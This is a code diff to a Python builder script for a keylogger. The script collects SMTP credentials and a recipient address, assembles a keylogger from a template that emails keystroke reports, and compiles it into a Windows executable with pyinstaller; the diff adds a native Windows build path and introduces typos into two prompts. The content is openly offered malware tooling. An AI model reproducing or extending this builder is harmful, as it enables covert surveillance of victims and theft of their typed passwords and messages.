@@ -45,8 +45,8 @@ def main(argv):
 		gpass = input('\t{0}Enter The Smtp password : {1}'.format(B,B))
 		mailfrom = input('\t{0}Enter The sender email : {1}'.format(B,B))
 		mailto = input('\t{0}Enter The reciver email : {1}'.format(B,B))
-		subject = input('\t{0}Enter The Subject for report mail : {1}'.format(B,B))
-		reportduration = input('\t{0}Enter The duration that you revecive report email in minutes : {1}'.format(B,B))
+		subject = input('\t{0}Enter The Subjectit for report mail : {1}'.format(B,B))
+		reportduration = input('\t{0}Enter The duraon that you revecive report email in minutes : {1}'.format(B,B))
 		keyconn = "interval=" + reportduration + "\nrunobjects('" + gserver + "' , '" + str(gport) + "' , '" + guser + "' , '" + gpass + "' , '" + mailfrom + "' , '" + mailto + "' , '" + subject + "')"
 		klgstr = getfcontent("templates/Gkeyloggertemplate.py")
 		klgstr += keyconn
@@ -54,7 +54,9 @@ def main(argv):
 		print(getfcontent("Keylogger.py"))
 		if sys.platform != "win32":
 			os.system("sudo wine pyinstaller --onefile --icon='" + iconfile + "' --hidden-import='/root/.wine/drive_c/users/root/Local Settings/Application Data/Programs/Python/Python38-32/Lib/site-packages/pywin32_system32/pywintypes32.dll' Keylogger.py")
-			print("open dist folder and get your exe keylogger ")
+		else:
+			os.system("pyinstaller --onefile --icon='" + iconfile + "' --hidden-import='pywintypes32.dll' Keylogger.py")
+		print("open dist folder and get your exe keylogger ")
 	else:
 		print('Not implemented yet')
 
